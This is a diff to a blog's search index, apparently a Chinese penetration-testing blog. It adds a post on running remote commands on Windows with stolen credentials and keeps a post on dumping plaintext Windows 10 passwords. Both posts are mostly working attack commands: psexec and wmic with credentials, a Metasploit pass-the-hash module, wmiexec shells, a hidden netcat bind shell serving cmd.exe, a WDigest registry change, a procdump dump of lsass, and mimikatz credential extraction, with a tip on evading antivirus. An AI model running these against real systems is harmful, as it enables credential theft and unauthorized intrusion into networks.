@@ -1,6 +1,19 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Windows远程执行命令]]></title>
+    <url>%2Fposts%2Fbf80d0ef.html%2F</url>
+    <content type="text"><![CDATA[只愿君心似我心，定不负相思意 当我们已经获取了远程系统的凭证（明文密码或 hash）时，可以直接通过3389远程登录进去收集信息、进行下一步的渗透，但是这样做的话会在系统上留下我们的操作记录，而且有可能邂逅管理员。大部分情况下，一个cmdshell 已经可以满足我们继续渗透的需求，所以不到万不得已的时候最好不要远程桌面连接(mstsc)，而是通过远程执行命令的方式继续开展工作。psexec.exe远程执行命令1psexec \\192.168.30.128 -u Administrator -p 123456789 cmd.exe这里一开始登陆的是另一个管理员账号，但是一直被拒绝访问，后来把Administrator账号取消隐藏，一下就连接上。之后看到一篇文章也有一样的情况，只有Administrator账号才能连接，就算是管理员用户组的其他用户也不能连接，UAC的问题。使用Hash登陆Windows1mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" "exit"或者使用wce抓取hash值：msf调用payload：1234567use exploit/windows/smb/psexecshow optionsset RHOST 192.168.30.128Set SMBPass 0182BD0BD4444BF867CD839BF040D93B:C22B315C040AE6E0EFEE3518D830362Bset SMBUser Administratorshow optionsRun利用wmiexec工具配合进行反弹半交互shell1cscript.exe //nologo wmiexec.vbs /shell 192.168.30.128 Administrator 123456789还可以单条命令执行WMI执行命令方式，无回显1wmic /node:192.168.30.128 /user:Administrator /password:123456789 process call create "cmd.exe /c ipconfig&gt;c:\result.txt"执行成功后可以在被控制的机器里面找到执行结果的文件nc远程执行先在被控机器上开启监听，-L：让监听者在连接多次掉线时仍坚持监听，-d：让nc隐藏运行，-e：指定要运行的程序，-p：监听的端口1nc.exe -L -d -e cmd.exe -p 55551控制端运行nc64.exe 192.168.30.128 5555]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>Windows</tag>
+        <tag>远程命令执行</tag>
+        <tag>内网渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Windows10明文密码抓取]]></title>
     <url>%2Fposts%2Fb500df40.html%2F</url>
     <content type="text"><![CDATA[桃李春风一杯酒，江湖夜雨十年灯 在默认情况下，当系统为win10时，系统默认在内存缓存中是禁止保存明文密码，所以要想使用mimikatz抓取明文账号密码，还得重新配置注册表并重登系统才能抓取明文。procdump+mimikatz获取win10用户明文密码测试环境：Win10 企业版LTSC 1809工具下载：k8版本的mz64.exe、procdumpv9.0原理：获取到内存文件lsass.exe进程(它用于本地安全和登陆策略)中存储的明文登录密码利用前提：拿到了admin权限的cmd，管理员用密码登录机器，并运行了lsass.exe进程，把密码保存在内存文件lsass进程中抓取明文：修改注册表，等待系统重新登录，截取dmp文件先修改注册表1reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f 修改完之后，重新登录账号，此时抓出来的密码就是明文显示。 在默认情况下，当系统为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，如下图，密码字段显示为null，此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。重登系统后，抓取dmp文件管理员权限运行1procdump64.exe -accepteula -ma lsass.exe 1.dmp也可以在任务管理器中导出文件，这里需要注意AppData隐藏文件夹把dmp文件导出到本地使用mimikatz读取密码 我这里是直接在机器上运行mimikatz读取密码了，在实际运用中一般会导出到本地再读取密码，这样才能躲避杀软检测流量特征。对了，这里需要注意的是，一开始我是用官方2.2.0、2.1.1版本的mz通通报错，google发现这应该是跟mz版本还有win10版本有关。1mz64.exe "sekurlsa::minidump 1.dmp" "sekurlsa::logonPasswords full" exit这里我用了k8的mz才没有报错，成功读出win10的明文密码]]></content>
@@ -8,9 +21,9 @@
         <category>内网渗透</category>
       </categories>
       <tags>
-        <tag>mimikatz</tag>
-        <tag>内网渗透</tag>
         <tag>Windows</tag>
+        <tag>内网渗透</tag>
+        <tag>mimikatz</tag>
         <tag>密码抓取</tag>
       </tags>
   </entry>
@@ -22,9 +35,9 @@
         <category>内网渗透</category>
       </categories>
       <tags>
-        <tag>mimikatz</tag>
-        <tag>内网渗透</tag>
         <tag>Windows</tag>
+        <tag>内网渗透</tag>
+        <tag>mimikatz</tag>
         <tag>密码抓取</tag>
       </tags>
   </entry>
